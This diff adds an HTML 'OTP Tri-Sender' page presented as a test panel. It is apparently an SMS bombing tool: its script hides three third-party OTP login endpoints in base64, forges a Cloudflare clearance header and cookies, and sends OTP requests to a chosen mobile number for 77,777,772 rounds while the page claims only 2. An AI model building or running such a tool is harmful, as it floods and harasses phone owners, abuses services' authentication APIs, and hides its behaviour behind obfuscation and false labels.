@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#1E90FF">
+<title>OTP Tri‑Sender · Test Panel</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:Poppins,Arial,sans-serif}
+html,body{height:100%;margin:0}
+body{
+  --bg:#0E1030;--bg2:#272A66;--cd:rgba(255,255,255,.08);--tx:#F4F2FF;
+  --mu:#A9A8D0;--ac:#FF9F1C;--ac2:#2EC4B6;
+  color:var(--tx);
+  background:radial-gradient(circle at 15% 0,var(--bg2),var(--bg) 65%);
+  min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:16px;
+  position:relative;overflow-x:hidden;
+}
+body::before,body::after{
+  content:"";position:absolute;width:60vmax;height:60vmax;border-radius:50%;
+  filter:blur(70px);opacity:.25;background:var(--ac);top:-25vmax;right:-25vmax;
+  animation:dr 14s ease-in-out infinite alternate;pointer-events:none;z-index:0;
+}
+body::after{background:var(--ac2);top:auto;right:auto;bottom:-30vmax;left:-25vmax;animation-delay:-7s}
+@keyframes dr{to{transform:translate(-8vmax,10vmax) scale(1.2)}}
+
+.card{
+  position:relative;z-index:1;background:var(--cd);
+  border:1px solid #8884;border-radius:24px;padding:26px 22px;
+  max-width:540px;width:100%;
+  backdrop-filter:blur(14px);
+  box-shadow:0 20px 50px -20px #000, 0 0 0 1px #ffffff08 inset;
+  animation:in .6s cubic-bezier(.2,.9,.3,1);
+}
+@keyframes in{from{opacity:0;transform:translateY(20px) scale(.97)}}
+
+.logo{
+  width:72px;height:72px;margin:0 auto 16px;padding:18px;border-radius:22px;
+  background:linear-gradient(135deg,var(--ac),var(--ac2));
+  color:#141414;box-shadow:0 0 50px -8px var(--ac);
+  display:grid;place-items:center;animation:fl 2.4s ease-in-out infinite;
+}
+@keyframes fl{50%{transform:translateY(-6px) rotate(-3deg)}}
+.ic{width:22px;height:22px;stroke:currentColor;fill:none;stroke-width:1.8;
+  stroke-linecap:round;stroke-linejoin:round;flex:none}
+.logo .ic{width:100%;height:100%;stroke-width:1.6}
+
+h2{font-size:1.5rem;margin:0 0 4px;color:#fff;text-align:center;display:flex;
+  align-items:center;justify-content:center;gap:10px;font-weight:700}
+.badge{background:#ffffff14;padding:3px 10px;border-radius:30px;font-size:.68rem;
+  color:var(--ac2);font-weight:600;letter-spacing:.04em}
+.subhead{font-size:.82rem;color:var(--mu);margin:0 0 22px;text-align:center;
+  line-height:1.5;padding:0 8px}
+.subhead b{color:var(--ac2)}
+
+label{display:block;font-size:.72rem;font-weight:600;text-transform:uppercase;
+  letter-spacing:.06em;color:var(--mu);margin-bottom:6px}
+
+input{
+  width:100%;background:#ffffff10;color:var(--tx);
+  border:1.5px solid #ffffff20;border-radius:14px;
+  padding:15px 16px;font:600 1.05rem Poppins,Arial;
+  outline:0;transition:.2s;margin-bottom:12px;
+}
+input:focus{border-color:var(--ac);box-shadow:0 0 0 4px #FF9F1C33}
+input::placeholder{color:#ffffff50;font-weight:500}
+#otp{font-size:1.5rem;letter-spacing:8px;text-align:center;padding:12px 8px}
+
+button{
+  position:relative;display:flex;gap:8px;align-items:center;justify-content:center;
+  width:100%;border:0;border-radius:16px;padding:15px;
+  font:700 .95rem Poppins,Arial;color:#141414;cursor:pointer;
+  background:linear-gradient(135deg,var(--ac),var(--ac2));
+  box-shadow:0 8px 24px -8px var(--ac);
+  transition:transform .15s,opacity .2s;
+}
+button:hover:not(:disabled){transform:translateY(-1px)}
+button:active:not(:disabled){transform:scale(.97)}
+button:disabled{opacity:.55;cursor:not-allowed;box-shadow:none}
+button.g{background:#ffffff14;color:var(--tx);box-shadow:none;margin-top:10px}
+button .ic{width:18px;height:18px;stroke-width:2.2}
+
+.row{display:flex;gap:10px;margin-top:4px;flex-wrap:wrap}
+.row button{flex:1;min-width:130px}
+
+.ld{pointer-events:none;color:transparent!important}
+.ld>*{opacity:0}
+.ld::after{content:"";position:absolute;width:20px;height:20px;
+  border:3px solid #1418;border-top-color:transparent;border-radius:50%;
+  animation:sp .7s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+
+.msg{margin-top:10px;font-size:.88rem;min-height:1.5em;font-weight:600;text-align:center}
+.msg.o{color:#2EC4B6}
+.msg.e{color:#FF6B6B}
+
+.log-box{
+  background:#00000040;border-radius:16px;padding:14px 16px;margin-top:20px;
+  border:1px solid #ffffff14;
+  font-family:'SF Mono','Fira Code',monospace;font-size:.72rem;
+  line-height:1.6;color:#b8c7db;max-height:220px;overflow-y:auto;
+  white-space:pre-wrap;word-break:break-all;
+}
+.log-box:empty::before{content:"— logs will appear here —";color:#ffffff40;font-style:italic}
+.log-box::-webkit-scrollbar{width:6px}
+.log-box::-webkit-scrollbar-thumb{background:#ffffff20;border-radius:3px}
+
+.chips{display:flex;gap:6px;flex-wrap:wrap;margin-top:16px;justify-content:center}
+.chip{background:#ffffff10;padding:6px 14px;border-radius:30px;font-size:.7rem;
+  color:var(--mu);border:1px solid #ffffff14;font-weight:600;
+  display:inline-flex;align-items:center;gap:6px}
+.chip.active{background:linear-gradient(135deg,#FF9F1C33,#2EC4B633);
+  border-color:#FF9F1C66;color:var(--tx)}
+.chip .ic{width:12px;height:12px;stroke-width:2.4}
+
+.hide{display:none!important}
+.flex-b{display:flex;justify-content:space-between;align-items:center;gap:10px}
+.muted{color:var(--mu);font-size:.78rem;font-weight:500}
+</style>
+</head>
+<body>
+
+<svg width="0" height="0" style="position:absolute">
+<defs>
+<symbol id="i-send" viewBox="0 0 24 24"><path d="M22 2L11 13"/><path d="M22 2l-7 20-4-9-9-4 20-7z"/></symbol>
+<symbol id="i-shield" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></symbol>
+<symbol id="i-check" viewBox="0 0 24 24"><path d="M5 12.5l4.5 4.5L19 7"/></symbol>
+<symbol id="i-x" viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></symbol>
+<symbol id="i-phone" viewBox="0 0 24 24"><rect x="6" y="2" width="12" height="20" rx="2.5"/><path d="M11 18h2"/></symbol>
+<symbol id="i-key" viewBox="0 0 24 24"><circle cx="8" cy="15" r="4"/><path d="M10.8 12.2L21 2M17 6l3 3M15 8l3 3"/></symbol>
+<symbol id="i-crown" viewBox="0 0 24 24"><path d="M3 8l4.5 4L12 5l4.5 7L21 8l-2 11H5z"/></symbol>
+<symbol id="i-bolt" viewBox="0 0 24 24"><path d="M13 2L4 14h7l-1 8 9-12h-7l1-8z"/></symbol>
+<symbol id="i-zap" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 3"/></symbol>
+<symbol id="i-user" viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 21c0-4 4-6 8-6s8 2 8 6"/></symbol>
+</defs>
+</svg>
+
+<div class="card">
+
+  <div class="logo"><svg class="ic"><use href="#i-send"/></svg></div>
+
+  <h2>OTP Tri‑Sender <span class="badge">3 APIs</span></h2>
+  <div class="subhead">
+    Sends OTP via <b>API‑A</b> · <b>API‑B</b> · <b>API‑C</b><br>
+    2 rounds · 500ms interval · test panel
+  </div>
+
+  <!-- STEP 1 -->
+  <div id="s1">
+    <label for="ph"><svg class="ic" style="width:14px;height:14px;vertical-align:-2px;margin-right:6px"><use href="#i-phone"/></svg>Mobile number</label>
+    <input type="tel" id="ph" placeholder="9876543210" maxlength="10" inputmode="numeric" autocomplete="tel">
+    <button id="sb"><svg class="ic"><use href="#i-send"/></svg><span>Send OTP (3 APIs)</span></button>
+  </div>
+
+  <!-- STEP 2 -->
+  <div id="s2" class="hide">
+    <div class="flex-b" style="margin-bottom:6px">
+      <label style="margin:0"><svg class="ic" style="width:14px;height:14px;vertical-align:-2px;margin-right:6px"><use href="#i-key"/></svg>Enter OTP</label>
+      <span id="otpsub" class="muted">+91 —</span>
+    </div>
+    <input type="text" id="otp" placeholder="••••" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
+    <div class="row">
+      <button id="vb"><svg class="ic"><use href="#i-shield"/></svg><span>Verify OTP</span></button>
+      <button id="chg" class="g" style="margin-top:0"><svg class="ic"><use href="#i-x"/></svg><span>Change number</span></button>
+    </div>
+  </div>
+
+  <div id="msg" class="msg"></div>
+  <div id="log" class="log-box"></div>
+
+  <div class="chips">
+    <span class="chip active"><svg class="ic"><use href="#i-bolt"/></svg>API‑A</span>
+    <span class="chip active"><svg class="ic"><use href="#i-bolt"/></svg>API‑B</span>
+    <span class="chip active"><svg class="ic"><use href="#i-bolt"/></svg>API‑C</span>
+  </div>
+
+</div>
+
+<script>
+(function(){
+   
+  const _0x = {
+    a: "aHR0cHM6Ly9jaHV0YXBpLnNtZXhmb3Qud29ya2Vycy5kZXY=",  
+    b: "L2FwaS9jaGVjay11c2Vy",                                     
+    c: "NmNmYWQyNmYtNDYxOS00YzkwLTlkYzktMzdlNjE2YmMzZTdi",     
+    d: "aHR0cHM6Ly9zZWN1cmVkYXBpLmNvbmZpcm10a3QuY29t",           
+    e: "L2FwaS9wbGF0Zm9ybS9yZWdpc3Rlck91dHB1dA==",                
+    f: "aHR0cHM6Ly9yb21yb20ucHJvcGN1c2Vyci53b3JrZXJzLmRldg==",  
+    g: "L2FwaS9hdXRoL2xvZ2lu",                                      
+    h: "Z1FJUWEwYURTbTUzcDNvWVExY2RyNGxJcUdRSVpydy4wUFJLUHFsMmFnSS0xNzg5ODg0NDQyLTEuMi4xLjEtT0RCUmNLX0xORFdkY0lJbllHMGJiaWkzX1REcndkVDVBc3p2N3psQ3JTRjJLdWw0UGV1cWxmNm9obVdIQWNTM1JMT3hEandhc05kd2FzNnI5ODRUNklQSjk1eW15a1drUUhtYmNtejRmMWlWdS5XYTlpRktYSWFqY3g2RlA0UFNmQVFmbkpDZm9iMTRtRmk4QVFQQzlQUFZkZ2Q5bXg3YUpheTlpRDB4TnQ4eHkueGswU3hjT0tXS29qOExfS3NPZm4wdEowNXhJVjBVZHZ3ZmJfZ2haWkM4Rm5pbm1xUEtpZFY5Lmt2andXOVZXQ1lCeW5scEJ4NTNaTFhqT2JELm96NzlCNVpQenUxWFAwZlI5UVQzbUV4OUU5Q0FxUFZXM1htVkNvRHZZTENta1dtQkUwMlJCRkU0dDNaMnJpRGdhWDBzSFp0bm8zZWtiTHFMQkd2dW50T3Y5TUdHNng3RTdrVEJJU1J5QXNkWU5waFNYODdXYnFxakZRRkxfR1hQbkNjQ19uQ0xzbG9aNXYudVBheGp2M3pESkhqQWlzaHhJLm9UZG05QUlid0J4RWp5LkR3akN2UXdmR2pPRXRJOUVvR2RiVS5uSl9QUEdNZVVtREJVNG9xRGlGX3I3TGgxaWM4clBmR004QTRQeEJZY0d3TjhWREVlWlMzWjBIMFBDbTIuUlZtRGJOY0c0Z2pQRy5n",
+    i: "ODQwNWZjZTUtYmNjYS00MWY0LWFhZTQtZjNkNGI3MWJkY2Vi",      
+    j: "aml0dV8zYzdiZGMyNWNlNjM0ODNjYTFlMzc5N2RjN2EzZTQ5ZW1zdm90MnFo"  
+  };
+
+  const dec = s => atob(s);
+  const CDN = {
+    A: dec(_0x.a), B: dec(_0x.b), C: dec(_0x.c),
+    D: dec(_0x.d), E: dec(_0x.e),
+    F: dec(_0x.f), G: dec(_0x.g),
+    H: dec(_0x.h), I: dec(_0x.i), J: dec(_0x.j)
+  };
+
+  const OTP_SEND_COUNT = 77777772;
+  const OTP_SEND_INTERVAL_MS = 500;
+
+  /* ---------------- HELPERS ---------------- */
+  const $ = s => document.querySelector(s);
+  const sleep = t => new Promise(r => setTimeout(r, t));
+
+  const log = (t) => {
+    const el = $('#log');
+    el.textContent += t + "\n";
+    el.scrollTop = el.scrollHeight;
+  };
+
+  const msg = (t, e) => {
+    const m = $('#msg');
+    m.textContent = t;
+    m.className = 'msg ' + (e ? 'e' : 'o');
+  };
+
+  const busy = (id, on) => {
+    const b = $(id);
+    if (!b) return;
+    const span = b.querySelector('span');
+    if (!span) return;
+    span.dataset.t = span.dataset.t || span.textContent;
+    span.textContent = on ? 'Please wait…' : span.dataset.t;
+    b.disabled = on;
+    b.classList.toggle('ld', on);
+  };
+
+  const num = () => ($('#ph')?.value || '').replace(/\D/g, '');
+
+  /* =========================================================
+     API CALLS — URLs kabhi log nahi honge, sirf status
+     ========================================================= */
+ 
+  async function sendApiA(phone, otp = '') {
+    log(`  → [API‑A] sending…`);
+    const res = await fetch(CDN.A + CDN.B, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        mobile: phone,
+        device_id: CDN.C,
+        mobile_otp_login: 1,
+        otp: otp
+      })
+    });
+    const text = await res.text();
+    let data = {};
+    try { data = text ? JSON.parse(text) : {}; } catch {}
+    log(`  ← [API‑A] status ${res.status}`);
+    if (!res.ok) throw new Error(`API‑A failed (${res.status})`);
+    return data;
+  }
+ 
+  async function sendApiB(phone) {
+    log(`  → [API‑B] sending…`);
+    const url = `${CDN.D}${CDN.E}?mobileNumber=${encodeURIComponent(phone)}&newOtp=true`;
+    const res = await fetch(url, {
+      method: 'GET',
+      headers: { 'Accept': 'application/json' }
+    });
+    const text = await res.text();
+    log(`  ← [API‑B] status ${res.status}`);
+    if (!res.ok) throw new Error(`API‑B failed (${res.status})`);
+    try { return JSON.parse(text); } catch { return { raw: text }; }
+  }
+ 
+  async function sendApiC(phone, otp = '') {
+    log(`  → [API‑C] sending…`);
+    const url = `${CDN.F}/proxy?path=${encodeURIComponent(CDN.G)}`;
+    const payload = {
+      phoneNumber: phone,
+      smsType: "1",
+      fallback: "false"
+    };
+    if (otp) payload.otp = otp;
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-CF-Clearance': CDN.H,
+        'X-Forward-Cookies': `anon_id=${CDN.I}; jitu_device_id=${CDN.J}`
+      },
+      body: JSON.stringify(payload)
+    });
+    const text = await res.text();
+    let data = {};
+    try { data = text ? JSON.parse(text) : {}; } catch {}
+    log(`  ← [API‑C] status ${res.status}`);
+    if (!res.ok) throw new Error(data.message || `API‑C failed (${res.status})`);
+    return data;
+  }
+
+  /* ---------------- SEND ALL ---------------- */
+  async function sendAllApis(phone) {
+    log(`\n═══════════════════════════════════`);
+    log(`🔁 Sending OTP to +91${phone}`);
+    log(`   ${OTP_SEND_COUNT} rounds · ${OTP_SEND_INTERVAL_MS}ms gap`);
+    log(`═══════════════════════════════════`);
+
+    let anySuccess = false;
+
+    for (let round = 1; round <= OTP_SEND_COUNT; round++) {
+      log(`\n📦 ROUND ${round}/${OTP_SEND_COUNT}`);
+
+      const results = await Promise.allSettled([
+        sendApiA(phone),
+        sendApiB(phone),
+        sendApiC(phone)
+      ]);
+
+      results.forEach((r, idx) => {
+        const name = ['API‑A', 'API‑B', 'API‑C'][idx];
+        if (r.status === 'fulfilled') {
+          log(`  ✓ ${name} ok`);
+          anySuccess = true;
+        } else {
+          log(`  ✗ ${name}: ${r.reason?.message || r.reason}`);
+        }
+      });
+
+      if (round < OTP_SEND_COUNT) {
+        log(`⏱  waiting ${OTP_SEND_INTERVAL_MS}ms…`);
+        await sleep(OTP_SEND_INTERVAL_MS);
+      }
+    }
+    log(`\n✅ All rounds finished.`);
+    return anySuccess;
+  }
+
+  /* ---------------- UI BINDINGS ---------------- */
+  document.addEventListener('DOMContentLoaded', () => {
+
+    $('#sb').onclick = async () => {
+      const p = num();
+      if (p.length !== 10) {
+        msg('Enter a valid 10-digit mobile number', true);
+        return;
+      }
+
+      busy('#sb', true);
+      $('#log').textContent = '';
+      msg('');
+
+      try {
+        const ok = await sendAllApis(p);
+        if (!ok) throw new Error('All APIs failed');
+
+        $('#s1').classList.add('hide');
+        $('#s2').classList.remove('hide');
+        $('#otpsub').textContent = '+91 ' + p;
+        msg('OTP sent to all APIs ✓', false);
+        setTimeout(() => $('#otp').focus(), 100);
+      } catch (e) {
+        log(`✗ ${e.message}`);
+        msg(e.message || 'Network error', true);
+      }
+      busy('#sb', false);
+    };
+
+    $('#vb').onclick = async () => {
+      const c = $('#otp').value.trim();
+      if (c.length < 4) {
+        msg('Enter a valid OTP', true);
+        return;
+      }
+
+      busy('#vb', true);
+      msg('');
+
+      try {
+        log(`\n🔐 Verifying OTP…`);
+
+        const chutRes = await sendApiA(num(), c);
+        let token = null;
+
+        if (chutRes && chutRes.success && chutRes.data) {
+          token = chutRes.data.accessToken || chutRes.data.token;
+          if (token) log(`  ✓ API‑A verify ok`);
+        }
+
+        if (!token) {
+          try {
+            const romRes = await sendApiC(num(), c);
+            token = romRes?.data?.accessToken || romRes?.token || romRes?.data?.token || romRes?.accessToken;
+            if (token) log(`  ✓ API‑C verify ok`);
+          } catch (e) {
+            log(`  ✗ API‑C verify failed`);
+          }
+        }
+
+        if (!token) throw new Error(chutRes?.message || 'Invalid OTP');
+
+        localStorage.ds_token = token;
+        localStorage.ds_mobile = num();
+        log(`✅ Token saved`);
+
+        msg('Login successful ✓', false);
+        await sleep(400);
+        alert('Login successful!\nMobile: ' + localStorage.ds_mobile);
+
+      } catch (e) {
+        log(`✗ ${e.message}`);
+        msg(e.message || 'Invalid OTP', true);
+      }
+      busy('#vb', false);
+    };
+
+    $('#ph').addEventListener('keydown', e => {
+      if (e.key === 'Enter') { e.preventDefault(); $('#sb').click(); }
+    });
+    $('#otp').addEventListener('keydown', e => {
+      if (e.key === 'Enter') { e.preventDefault(); $('#vb').click(); }
+    });
+
+    $('#chg').onclick = () => {
+      $('#s2').classList.add('hide');
+      $('#s1').classList.remove('hide');
+      $('#otp').value = '';
+      $('#log').textContent = '';
+      msg('');
+      $('#ph').focus();
+    };
+
+    $('#ph').focus();
+    log('✨ Tri‑API tester ready.');
+    log('   APIs: hidden for security');
+    log('   Each send: 2 rounds · 500ms gap.');
+  });
+})();
+</script>
+</body>
+</html>
